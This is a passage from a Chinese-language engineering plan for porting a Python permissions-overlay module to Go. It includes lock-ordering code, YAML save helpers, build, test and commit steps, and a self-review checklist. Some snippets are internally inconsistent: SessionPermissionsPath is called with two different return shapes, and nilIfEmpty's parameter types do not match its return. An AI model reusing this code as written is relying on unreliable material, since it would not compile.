		"level":          lv,
		"effective_level": nilIfEmptyString(effectiveLevel),
		"revoked":        revoked,
	}, nil
}
```

```go
// SaveUserPermissions 保存用户层 overlay。
//
// Python: save_user_permissions(data)
func SaveUserPermissions(data map[string]any) bool {
	return UpdateUserPermissions(func(_ map[string]any) map[string]any {
		if data == nil {
			return map[string]any{}
		}
		return shallowCopyMap(data)
	})
}

// SaveUserPermissionsLocked 保存已校验的 user overlay。调用方须持有
// PermissionStorageLock。
//
// Python: save_user_permissions_locked(data)
func SaveUserPermissionsLocked(data map[string]any) bool {
	return dumpYAMLDict(UserPermissionsPath(), stripPrivateKeys(data))
}

// SaveSessionPermissionsLocked 保存会话 overlay。调用方须持有
// PermissionStorageLock。
//
// Python: save_session_permissions_locked(session_id, data)
func SaveSessionPermissionsLocked(sessionID string, data map[string]any) bool {
	path, err := SessionPermissionsPath(sessionID)
	if err != nil {
		return false
	}
	return dumpYAMLDict(path, stripPrivateKeys(data))
}

// UpdateUserPermissions 在共享锁下把 mutator 应用到最新文档。
//
// Python: update_user_permissions(mutator)
func UpdateUserPermissions(mutator func(map[string]any) map[string]any) bool {
	release, err := PermissionStorageLock("")
	if err != nil {
		logger.Warn(logComponent).Err(err).Msg("permissions.layers.user_update_failed")
		return false
	}
	defer release()

	current := LoadUserPermissions()
	updated := mutator(current)
	return dumpYAMLDict(UserPermissionsPath(), stripPrivateKeys(updated))
}
```

**辅助函数**（同文件末尾）：

```go
// nilIfEmpty 参数为 nil 时用 fallback 生成。
func nilIfEmpty(v, fallback func() map[string]any) map[string]any {
	if v != nil {
		return v
	}
	return fallback()
}

// unionSets 合并多个字符串集合。
func unionSets(sets ...map[string]struct{}) map[string]struct{} {
	total := 0
	for _, s := range sets {
		total += len(s)
	}
	out := make(map[string]struct{}, total)
	for _, s := range sets {
		for k := range s {
			out[k] = struct{}{}
		}
	}
	return out
}

// toAnySliceFromMaps 把 map 列表转为 []any。
func toAnySliceFromMaps(items []map[string]any) []any {
	out := make([]any, 0, len(items))
	for _, m := range items {
		out = append(out, m)
	}
	return out
}

// nilIfEmptyString 空串返回 nil，非空返回原值。
func nilIfEmptyString(s string) any {
	if s == "" {
		return nil
	}
	return s
}

// getConfigDir 返回配置目录。
//
// Python: get_config_dir() → <config_dir>
func getConfigDir() string {
	return pathutil.ConfigDir()
}

// getAgentSessionsDir 返回 agent 会话目录。
//
// Python: get_agent_sessions_dir()
func getAgentSessionsDir() string {
	return pathutil.AgentSessionsDir()
}

// readConfigYAML 读取 agent 配置文件的 permissions 段。
//
// 复用 security 包的 ReadAgentConfigYAML（空路径表示默认配置路径），
// 与 permissions_config_rpc.go 的 readYAMLData 同源。
//
// Python: load_yaml_round_trip(config.CONFIG_YAML_PATH)
func readConfigYAML() (map[string]any, error) {
	data := security.ReadAgentConfigYAML("")
	if data == nil {
		return map[string]any{}, nil
	}
	return data, nil
}

// writeConfigYAML 写回 agent 配置文件。
//
// Python: dump_yaml_round_trip(config.CONFIG_YAML_PATH, data)
func writeConfigYAML(data map[string]any) error {
	return security.WriteAgentConfigYAML("", data)
}
```

> **依赖**：`pathutil.ConfigDir()` / `pathutil.AgentSessionsDir()` 来自
> `internal/common/utils/path`（已核实存在，`paths.go:224` / `:318`）；
> `security.ReadAgentConfigYAML("")` / `WriteAgentConfigYAML("", data)` 来自
> `internal/agentcore/harness/security/patterns.go`（已核实，
> `permissions_config_rpc.go:649` / `:658` 已在用）。
>
> **import 路径**：
> ```go
> import (
> 	pathutil "github.com/uapclaw/uapclaw-go/internal/common/utils/path"
> 	"github.com/uapclaw/uapclaw-go/internal/agentcore/harness/security"
> )
> ```
>
> ⚠️ `permissions` 包已 import `security`（`permissions_persist.go` 在用
> `harnesssecurity.*`），不会成环。

- [ ] **Step 3: 实现 `PermissionStorageLock`**

```go
// PermissionStorageLock 按 Global → User → Session 顺序加锁，不可重入。
//
// 三把锁依次获取：config 目录锁 → user_permissions.yaml 锁 →
// session_permissions.yaml 锁（有 sessionID 时）。释放顺序相反。
//
// Python: @contextmanager permission_storage_lock(session_id, *, lock_timeout)
func PermissionStorageLock(sessionID string) (func(), error) {
	releaseFns := make([]func(), 0, 3)
	releaseAll := func() {
		for i := len(releaseFns) - 1; i >= 0; i-- {
			releaseFns[i]()
		}
	}

	// 1. config 目录锁（对齐 Python config_write_lock）
	configDir := getConfigDir()
	if err := os.MkdirAll(configDir, 0o755); err != nil {
		return nil, err
	}
	dirLock, err := local.AcquireFileLock(filepath.Join(configDir, ".permissions.lock"), lockTimeout)
	if err != nil {
		return nil, err
	}
	releaseFns = append(releaseFns, func() { _ = local.ReleaseFileLock(dirLock) })

	// 2. user 文件锁
	userPath := UserPermissionsPath()
	if err := os.MkdirAll(filepath.Dir(userPath), 0o755); err != nil {
		releaseAll()
		return nil, err
	}
	userLock, err := local.AcquireFileLock(userPath, lockTimeout)
	if err != nil {
		releaseAll()
		return nil, err
	}
	releaseFns = append(releaseFns, func() { _ = local.ReleaseFileLock(userLock) })

	// 3. session 文件锁
	if strings.TrimSpace(sessionID) != "" {
		sessPath := SessionPermissionsPath(sessionID)
		if err := os.MkdirAll(filepath.Dir(sessPath), 0o755); err != nil {
			releaseAll()
			return nil, err
		}
		sessLock, err := local.AcquireFileLock(sessPath, lockTimeout)
		if err != nil {
			releaseAll()
			return nil, err
		}
		releaseFns = append(releaseFns, func() { _ = local.ReleaseFileLock(sessLock) })
	}
	return releaseAll, nil
}
```

- [ ] **Step 4: 跑测试 + 覆盖率 + 提交**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" -cover ./internal/swarm/agents/harness/common/rails/permissions/ -run 'TestAsPermissions|TestOverlayFrom|TestOrderedToolNames|TestSetUserToolLevel|TestStripToolOverrides' -v 2>&1 | tail -20
gofmt -l internal/swarm/agents/harness/common/rails/permissions/
git add internal/swarm/agents/harness/common/rails/permissions/permissions_layers.go \
        internal/swarm/agents/harness/common/rails/permissions/permissions_layers_test.go
git commit -m "feat(permissions): 三层权限覆盖读写（permissions_layers.py 676 行）

40 个函数对齐。三处易错：
- as_permissions_section 双形态：{permissions:{...}} 且自身无 overlay 键时取内层
- overlay_from_effective 的 base_ask/base_deny 只算 global 层（allow 算三层）——
  有意的不对称，ask/deny 不可被上层放宽
- strip_tool_overrides 多工具共享的 override 只摘名字不整体删

锁顺序 Global → User → Session 固定，用 AcquireFileLock 的
LOCK_EX|LOCK_NB + 轮询实现 never-reenter 语义（sync.Mutex 重入会死锁，
文件锁重入会超时失败，符合预期）。"
git show --stat HEAD
```

---

## Task 17：`doc.go` 同步 + 计划表回填 + 最终验证

**Files:**
- Modify: `internal/agentcore/harness/security/doc.go`
- Modify: `internal/swarm/agents/harness/common/rails/permissions/doc.go`
- Modify: `IMPLEMENTATION_PLAN.md`

- [ ] **Step 1: 更新 `security/doc.go`**

删除 `ExternalDirectoryChecker` 三处条目（L5/L10/L24），加 fileguard / netguard / toolguard 三个子包条目，加 `PreparePermissionsForEngine` 与 A/B/C 管线说明。

- [ ] **Step 2: 更新 `permissions/doc.go`**

文件树加入 8 个新文件，更新「已知缺口」段（删除已完成的 ⤵️，保留 9.90d/9.90e 的）。

- [ ] **Step 3: 回填 `IMPLEMENTATION_PLAN.md`**

把 9.90b 行状态改为 ✅，附完成摘要与 commit 范围。

- [ ] **Step 4: 删除锚点全量校验（规则 8.3）**

```bash
cd /home/opensource/uapclaw-gateway
echo "=== ExternalDirectoryChecker ==="
grep -rn "ExternalDirectoryChecker" internal/ tests/ cmd/ || echo "0 命中 ✅"
echo "=== SetWorkspaceRoot ==="
grep -rn "SetWorkspaceRoot" internal/ tests/ cmd/ || echo "0 命中 ✅"
echo "=== checker.go ==="
ls internal/agentcore/harness/security/checker.go 2>/dev/null || echo "文件已删 ✅"
echo "=== collectExternalDirectoryPersistPaths ==="
grep -rn "collectExternalDirectoryPersistPaths" internal/ || echo "0 命中 ✅"
```

Expected: 四项全部 ✅。

- [ ] **Step 5: 最终全量验证**

```bash
cd /home/opensource/uapclaw-gateway
go build ./... && echo "BUILD OK"
go vet ./... && echo "VET OK"
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./... 2>&1 | grep -E "^(FAIL|---)" | head -20
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./... 2>&1 | grep -c "^ok"
```

Expected: BUILD OK / VET OK / 无 FAIL / ok 包数 ≥ Task 0 记录的基线。

- [ ] **Step 6: 覆盖率校验（受影响包）**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" -cover \
  ./internal/common/permission_tools/ \
  ./internal/agentcore/harness/security/ \
  ./internal/agentcore/harness/security/fileguard/ \
  ./internal/agentcore/harness/security/netguard/ \
  ./internal/agentcore/harness/security/toolguard/ \
  ./internal/agentcore/harness/resources/ \
  ./internal/swarm/agents/harness/common/rails/permissions/ \
  ./internal/agentcore/harness/rails/security/
```

Expected: 每个包 ≥ 85%。

- [ ] **Step 7: 集成审计**

```bash
go run ./cmd/integration-audit -verify 2>&1 | tail -20
```

Expected: 通过。若失败，逐目录修复（多为删除的 `checker.go` 被集成测试引用）。

- [ ] **Step 8: 最终提交**

```bash
gofmt -l internal/
git add internal/agentcore/harness/security/doc.go \
        internal/swarm/agents/harness/common/rails/permissions/doc.go \
        IMPLEMENTATION_PLAN.md
git commit -m "docs(permissions): 9.90b 收口——doc.go 同步 + 计划表回填

security/doc.go 删除 ExternalDirectoryChecker 三条目，加 fileguard /
netguard / toolguard 三个子包与 A/B/C 三段管线说明。

permissions/doc.go 文件树补 8 个新文件，更新已知缺口。

IMPLEMENTATION_PLAN.md 的 9.90b 行改为 ✅。"
git show --stat HEAD
```

---

## 自审清单（写计划后必跑）

**1. Spec 覆盖**

| Spec 章节 | 对应任务 |
|---|---|
| §3.1 permission_tools | Task 1 |
| §3.2 file_tool_specs | Task 4 |
| §3.3 path_extract | Task 5 |
| §3.4 file_guard | Task 6 |
| §3.5 sensitive_paths | Task 7 |
| §3.6 net_guard / net_urls | Task 8 |
| §3.7 builtin_rules | Task 3 |
| §3.8 resources 扩展 | Task 2 |
| §3.9 core.py 重写 | Task 9 |
| §3.10 tool_capabilities | Task 13 |
| §3.11 tool_decision_facts | Task 14 |
| §3.12 network_scope | Task 12 |
| §3.13 policy_eval | Task 15 |
| §3.14 permissions_layers | Task 16 |
| §3.15 三个小文件 | Task 12 |
| §4 tool_security_rail 改造 | Task 11 |
| §5 删除清单 | Task 9 + Task 17 Step 4 |
| §12.5 三项新发现 | Task 3（builtin_rules）+ Task 3a（canonicalize）+ Task 11（host 字段） |
| §12.5.1 六项 A 段缺陷 | Task 3b |
| §12.5.2 YAML 补齐 | Task 2 |
| §12.5.3 持久化三层 | Task 11 |
| D3 循环依赖 | Task 5 Step 8 |
| R10 prepare 缺口 | Task 3 Step 6 |

**2. 占位符扫描**：已逐轮修复，当前无 TBD / TODO / 「类似 Task N」/ 「补充测试」/ 「按 Python 逐行翻译」类表述。首轮写完后发现并补齐的四处：

| 位置 | 原问题 | 修复 |
|---|---|---|
| Task 5 Step 9 | 「完整代码按 Python 逐行翻译」无代码 | 补齐 8 组常量 + 14 个函数完整实现 |
| Task 6 Step 4/7 | 「按 spec 伪码实现」无代码 | 补齐 `normalizeLegacy` / `normalizeNative` / `compileWorkspaceAxisRule` / `resolveOne` / `collectAccesses` / `ReportLegacyPathRulesAtLoad` 等 12 个函数 |
| Task 10 Step 4 | 「按 Python 逐行翻译」无代码 | 补齐 `MergeFileGuardAccessAllows` / `mergeFileGuardPathRule` / `axesForFileGuardAction` / `escalateAxisTowardAllow` |
| Task 16 Step 2 | 「40 个函数按 Python 逐行翻译」 | 补齐六组共 40 个函数完整实现 |
| Task 9 Step 3 | `fileguardBridge` 只描述未给代码 | 补齐 `SensitivePathsMerger` 三元组与三个 apply 函数 |
| Task 9 Step 6 | `NewFileGuardEvaluatorForTest` 为虚构 API | 改为 `engine.CheckPermission` 的临时实现，并在 Task 9 Step 3 提供正式的 `NewFileGuardEvaluator` |

同时修正了三处**引用了不存在的函数**：
- `utils.GetConfigDir()` → `pathutil.ConfigDir()`（核实存在，`paths.go:224`）
- `utils.GetAgentSessionsDir()` → `pathutil.AgentSessionsDir()`（`paths.go:318`）
- `config.Get()` / `config.ConfigYAMLPath()` → `security.ReadAgentConfigYAML("")`（`permissions_config_rpc.go:649` 已在用）

**3. 类型一致性**：
- `FileAccess`（Task 5）与 `PathAction`（Task 9）是两个类型：前者内含 `Source` 字段供抽取层用，后者是跨包传输的精简形式。Task 5 的 `ExtractAccessesNative` 返回 `[]FileAccess`；Task 6 的 `CollectAskAccesses` 返回 `[]PathAction`。**调用方不可混用。**
- `FileAction`（string 别名，Task 4）与 `PathAction.Action`（string，Task 9）：前者在抽取层用，后者在跨包传输用，转换点在 Task 6 Step 7 的 `CollectAskAccesses`。
- `FileGuardEvaluator`（Task 9）与 `*FileGuardChecker`（Task 6）：前者是接口，后者是唯一实现，`var _ security.FileGuardEvaluator = (*FileGuardChecker)(nil)` 在 Task 6 Step 7 断言。
- `security.PermissionLevel` 在 fileguard / netguard 内一律带 `security.` 前缀引用（跨包），Task 4-8 的所有返回类型均为 `*security.PermissionResult`。
